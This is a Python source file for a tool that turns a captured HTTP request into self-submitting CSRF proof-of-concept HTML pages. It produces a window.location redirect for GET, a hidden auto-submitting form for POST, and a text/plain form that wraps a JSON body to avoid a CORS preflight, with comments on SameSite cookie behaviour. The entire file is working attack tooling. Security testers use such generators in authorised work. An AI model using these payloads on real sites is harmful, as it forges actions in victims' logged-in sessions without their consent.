from urllib.parse import parse_qs
from typing import Dict, Any
import json

class CSRFGenerator:
    def __init__(self, base_url: str):
        self.base_url = base_url.rstrip("/")

    def generate(self, raw_request: str) -> Dict[str, Any]:
        parsed = self._parse_request(raw_request)
        poc_html = self._build_poc(parsed)

        return {
            "endpoint": parsed["url"],
            "method": parsed["method"],
            "content_type": parsed["content_type"],
            "poc_html": poc_html
        }

    def _parse_request(self, raw_request: str) -> Dict[str, Any]:
        if "\r\n\r\n" in raw_request:
            head, body = raw_request.split("\r\n\r\n", 1)
        elif "\n\n" in raw_request:
            head, body = raw_request.split("\n\n", 1)
        else:
            head = raw_request
            body = ""

        lines = head.strip().split("\n")
        request_line = lines[0]
        method, path, _ = request_line.split()

        headers = {}
        for line in lines[1:]:
            if ":" in line:
                key, value = line.split(":", 1)
                headers[key.lower().strip()] = value.strip()

        content_type = headers.get("content-type", "application/x-www-form-urlencoded")

        if path.startswith("http"):
            full_url = path
        else:
            full_url = f"{self.base_url}{path}"

        return {
            "method": method.upper(),
            "url": full_url,
            "headers": headers,
            "body": body.strip(),
            "content_type": content_type
        }

    def _build_poc(self, data: Dict[str, Any]) -> str:
        method = data["method"]
        url = data["url"]
        content_type = data["content_type"]
        body = data["body"]

        if method == "GET":
            return self._get_poc(url)
        
        if "application/json" in content_type:
            return self._json_poc(url, body)
        return self._form_poc(url, body)

    def _get_poc(self, url: str) -> str:
        """
        Uses window.location to trigger navigation. 
        Top-level navigation is more likely to include SameSite=Lax cookies.
        """
        return f"""<html>
  <body>
    <script>
      window.location.href = "{url}";
    </script>
  </body>
</html>"""

    def _form_poc(self, url: str, body: str) -> str:
        """Standard POST exploit using hidden form."""
        parsed = parse_qs(body)
        inputs = ""
        for key, values in parsed.items():
            for val in values:
                inputs += f'      <input type="hidden" name="{key}" value="{val}" />\n'

        return f"""<html>
  <body>
    <form action="{url}" method="POST" id="csrf-form">
{inputs}    </form>
    <script>
      document.getElementById('csrf-form').submit();
    </script>
  </body>
</html>"""

    def _json_poc(self, url: str, body: str) -> str:
        """
        Bypasses CORS Preflight (OPTIONS request).
        Uses a form with text/plain encoding to wrap JSON.
        """
        # We wrap the JSON in a form parameter name to force it into the body
        # Many backends will still parse this if they aren't strictly checking content-type
        return f"""<html>
  <body>
    <form action="{url}" method="POST" enctype="text/plain" id="csrf-form">
      <input type="hidden" name='{body[:-1]}, "ignore_me":"' value='test" }}' />
    </form>
    <script>
      document.getElementById('csrf-form').submit();
    </script>
  </body>
</html>"""
